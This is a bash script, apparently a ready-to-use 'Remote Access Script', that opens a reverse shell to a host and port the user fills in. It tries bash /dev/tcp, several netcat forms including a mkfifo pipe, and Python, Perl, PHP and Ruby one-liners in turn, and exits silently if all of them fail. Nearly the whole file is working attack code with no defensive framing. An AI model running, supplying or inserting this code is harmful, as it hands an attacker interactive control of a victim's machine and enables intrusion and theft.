#!/bin/bash

# Remote Access Script
# This script establishes a reverse shell connection

# Configuration
REMOTE_HOST="127.0.0.1"  # Replace with your actual IP address
REMOTE_PORT=4444         # Replace with your desired port

# Function to attempt connection using different methods
establish_connection() {
    # Try using bash
    if command -v bash > /dev/null 2>&1; then
        bash -i >& /dev/tcp/$REMOTE_HOST/$REMOTE_PORT 0>&1 2>&1 && return
    fi
    
    # Try using netcat variants
    if command -v nc > /dev/null 2>&1; then
        nc -e /bin/bash $REMOTE_HOST $REMOTE_PORT && return
        nc -c bash $REMOTE_HOST $REMOTE_PORT && return
        rm -f /tmp/f; mkfifo /tmp/f && cat /tmp/f | /bin/bash -i 2>&1 | nc $REMOTE_HOST $REMOTE_PORT > /tmp/f && return
    fi
    
    # Try using Python
    if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$REMOTE_HOST'",'$REMOTE_PORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' && return
    fi
    
    # Try using Perl
    if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;$i="'$REMOTE_HOST'";$p='$REMOTE_PORT';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' && return
    fi
    
    # Try using PHP
    if command -v php > /dev/null 2>&1; then
        php -r '$sock=fsockopen("'$REMOTE_HOST'",'$REMOTE_PORT');exec("/bin/bash -i <&3 >&3 2>&3");' && return
    fi
    
    # Try using Ruby
    if command -v ruby > /dev/null 2>&1; then
        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("'$REMOTE_HOST'","'$REMOTE_PORT'");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' && return
    fi
}

# Main execution
establish_connection

# If all connection attempts fail, exit silently
exit 0